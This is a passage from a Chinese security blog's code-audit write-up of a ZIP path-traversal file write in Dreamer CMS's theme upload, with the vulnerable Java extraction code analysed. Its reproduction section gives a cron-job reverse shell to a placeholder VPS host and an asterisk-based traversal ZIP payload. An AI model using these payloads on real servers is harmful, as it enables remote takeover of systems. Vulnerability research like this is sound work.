+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155159855.png" alt="image-20260405155159855" /></p>
+<p>成功创建了 a 文件</p>
+<p>就相当于任意文件上传，写个定时任务即可getshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create a file named xxxx*root and write the expression of the cron bounce shell</span><br><span class="line">echo &quot;*/1 * * * * bash -i &gt;&amp; /dev/tcp/VPSIP/2333 0&gt;&amp;1&quot; &gt; .\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*var\*spool\*cron\*root</span><br><span class="line"></span><br><span class="line">Make a zip file</span><br><span class="line">zip -r ./poc1.zip .\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*.\.\*var\*spool\*cron\*root</span><br></pre></td></tr></table></figure>
+<p>写了一个反弹 shell 的定时任务</p>
+<p>然后监听端口</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155319131.png" alt="image-20260405155319131" /></p>
+<h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2>
+<p>定位漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Log(operType = OperatorType.INSERT, module = &quot;主题管理&quot;, content = &quot;添加主题&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/add&quot;)</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;j8rj0lp8&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">add</span><span class="params">(String themePath)</span> <span class="keyword">throws</span> IOException, CmsException &#123;</span><br><span class="line">    Theme theme;</span><br><span class="line">    <span class="type">String</span> <span class="variable">rootPath</span> <span class="operator">=</span> fileConfiguration.getResourceDir();</span><br><span class="line">    <span class="type">System</span> <span class="variable">system</span> <span class="operator">=</span> systemService.getSystem();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uploadDir</span> <span class="operator">=</span> system.getUploaddir();</span><br><span class="line">    </span><br><span class="line">    <span class="type">String</span> <span class="variable">uploadpath</span> <span class="operator">=</span> rootPath + File.separator + uploadDir + File.separator + themePath;</span><br><span class="line">    <span class="type">File</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadpath);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//解压zip</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">targetDir</span> <span class="operator">=</span> rootPath + <span class="string">&quot;templates/&quot;</span>;</span><br><span class="line">    theme = ZipUtils.unZipFiles(zipFile, targetDir);</span><br><span class="line">    <span class="type">String</span> <span class="variable">themeJsonFilePath</span> <span class="operator">=</span> theme.getThemePath() + File.separator + <span class="string">&quot;theme.json&quot;</span>;</span><br><span class="line">    <span class="type">File</span> <span class="variable">themeJsonFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(themeJsonFilePath);</span><br><span class="line">    <span class="keyword">if</span>(!themeJsonFile.exists()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(</span><br><span class="line">                ExceptionEnum.FILE_NOTFOUND_EXCEPTION.getCode(), </span><br><span class="line">                ExceptionEnum.FILE_NOTFOUND_EXCEPTION.getMessage(),</span><br><span class="line">                <span class="string">&quot;主题包中不包含theme.json描述文件，请仔细检查主题包再上传。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> FileUtils.readFileToString(themeJsonFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">    <span class="keyword">if</span>(jsonObject == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileFormatErrorException</span>(</span><br><span class="line">                ExceptionEnum.FILE_FORMAT_ERROR_EXCEPTION.getCode(), </span><br><span class="line">                ExceptionEnum.FILE_FORMAT_ERROR_EXCEPTION.getMessage(),</span><br><span class="line">                <span class="string">&quot;主题描述文件theme.json格式错误，请仔细检查描述文件内容再上传。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!jsonObject.containsKey(<span class="string">&quot;themeName&quot;</span>) </span><br><span class="line">            || !jsonObject.containsKey(<span class="string">&quot;themeImage&quot;</span>) </span><br><span class="line">            || !jsonObject.containsKey(<span class="string">&quot;themeAuthor&quot;</span>)</span><br><span class="line">            || !jsonObject.containsKey(<span class="string">&quot;themePath&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileFormatErrorException</span>(</span><br><span class="line">                ExceptionEnum.FILE_FORMAT_ERROR_EXCEPTION.getCode(), </span><br><span class="line">                ExceptionEnum.FILE_FORMAT_ERROR_EXCEPTION.getMessage(),</span><br><span class="line">                <span class="string">&quot;主题描述文件theme.json格式错误，请仔细检查描述文件内容再上传。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">themeName</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;themeName&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">themeImage</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;themeImage&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">themeAuthor</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;themeAuthor&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">themePath1</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;themePath&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(StringUtil.isBlank(themeName) </span><br><span class="line">            || StringUtil.isBlank(themeImage) </span><br><span class="line">            || StringUtil.isBlank(themeAuthor) </span><br><span class="line">            || StringUtil.isBlank(themePath1)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileFormatErrorException</span>(</span><br><span class="line">                ExceptionEnum.FILE_FORMAT_ERROR_EXCEPTION.getCode(), </span><br><span class="line">                ExceptionEnum.FILE_FORMAT_ERROR_EXCEPTION.getMessage(),</span><br><span class="line">                <span class="string">&quot;主题描述文件theme.json格式错误，请仔细检查描述文件内容是否有为空的项。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    theme.setId(UUIDUtils.getPrimaryKey());</span><br><span class="line">    theme.setThemeName(themeName);</span><br><span class="line">    theme.setThemeImg(themeImage);</span><br><span class="line">    theme.setThemeAuthor(themeAuthor);</span><br><span class="line">    theme.setThemePath(themePath1);</span><br><span class="line">    theme.setCreateBy(TokenManager.getToken().getId());</span><br><span class="line">    theme.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    theme.setStatus(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;default&quot;</span>.equals(theme.getThemePath())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;默认模版不可覆盖！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Theme&gt; list = themeService.queryByPathName(theme.getThemePath());</span><br><span class="line">    <span class="keyword">if</span>(list != <span class="literal">null</span> &amp;&amp; list.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">Theme</span> <span class="variable">oldTheme</span> <span class="operator">=</span> list.get(<span class="number">0</span>);</span><br><span class="line">        theme.setId(oldTheme.getId());</span><br><span class="line">        theme.setUpdateBy(TokenManager.getToken().getId());</span><br><span class="line">        theme.setUpdateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        theme.setStatus(<span class="literal">null</span>);</span><br><span class="line">        themeService.update(theme);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> themeService.save(theme);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/admin/theme/list&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203531731.png" alt="image-20260405203531731" /></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Theme <span class="title function_">unZipFiles</span><span class="params">(File zipFile, String descDir)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">pathFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(descDir);</span><br><span class="line">    <span class="keyword">if</span> (!pathFile.exists()) &#123;</span><br><span class="line">        pathFile.mkdirs();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Theme</span> <span class="variable">theme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Theme</span>();</span><br><span class="line">    <span class="comment">// 解决zip文件中有中文目录或者中文文件</span></span><br><span class="line">    <span class="type">ZipFile</span> <span class="variable">zip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(zipFile, Charset.forName(<span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">Enumeration</span> <span class="variable">entries</span> <span class="operator">=</span> zip.entries(); entries.hasMoreElements();) &#123;</span><br><span class="line">        <span class="type">ZipEntry</span> <span class="variable">entry</span> <span class="operator">=</span> (ZipEntry) entries.nextElement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">zipEntryName</span> <span class="operator">=</span> entry.getName();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> zip.getInputStream(entry);</span><br><span class="line">        <span class="type">String</span> <span class="variable">outPath</span> <span class="operator">=</span> (descDir + zipEntryName).replaceAll(<span class="string">&quot;\\*&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="comment">// 判断路径是否存在,不存在则创建文件路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPath.substring(<span class="number">0</span>, outPath.lastIndexOf(<span class="string">&#x27;/&#x27;</span>)));..</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(file.getParent().equals(pathFile.getAbsolutePath()) &amp;&amp; file.isDirectory()) &#123;</span><br><span class="line">            theme.setThemePath(file.getAbsolutePath());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断文件全路径是否为文件夹,如果是上面已经上传,不需要解压</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">File</span>(outPath).isDirectory()) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出文件路径信息</span></span><br><span class="line">        System.out.println(outPath);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outPath);</span><br><span class="line">        <span class="type">byte</span>[] buf1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf1)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            out.write(buf1, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;******************解压完毕******************&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> theme;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是限制了我们的目录穿越的，但是为什么又可以呢，这个就涉及到我们的特殊 payload 了</p>
+<p>为什么是有星号了</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203810951.png" alt="image-20260405203810951" /></p>
+<p>这样正好替换了</p>
+<p>造成我们的目录穿越，导致任意文件写入了</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203825281.png" alt="image-20260405203825281" /></p>
+<p>这里会报错</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203833755.png" alt="image-20260405203833755" /></p>
+<p>这个无所谓的，因为在模板解析报错之前我们的压缩已经完成了</p>
+<p>代码如下</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203847638.png" alt="image-20260405203847638" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="软件安全赛2025半决复现" class="lazyload">
+          
+        
+        <a href="/2026/04/17/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B2025%E5%8D%8A%E5%86%B3%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            软件安全赛2025半决复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="NCTF2026" class="lazyload">
+        
+      
+      <a href="/2026/04/04/NCTF2026/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          NCTF2026
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text"> 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-%E5%8E%8B%E7%BC%A9%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text"> zip 压缩的漏洞点原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text"> 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text"> 漏洞分析</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[代码审计]dreamer_cms任意文件写入",
+          url: "http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/",
+          excerpt: "",
+          description: "",
+          stripContent: " 环境搭建 kxiangtian/dreamer_cms: Dreamer CMS 梦想家内容发布系统是国内首款java开发的内容发布系统，采用最流行的springboot+thymeleaf框架搭建，灵活小巧，配置简单。 CMS包括两个部分（代码部分、资源部分）代码不多说。资源就是图片、模版等，该目录在application.yml中web.upload-path配置项目中配置。  克隆项目到本地工作空间 导入Eclipse或Sts等开发工具（推荐使用Spring Tools Suite 4）",
+          date: "Sun Apr 05 2026 15:09:05 GMT+0800",
+          updated: "Thu Apr 09 2026 19:50:52 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
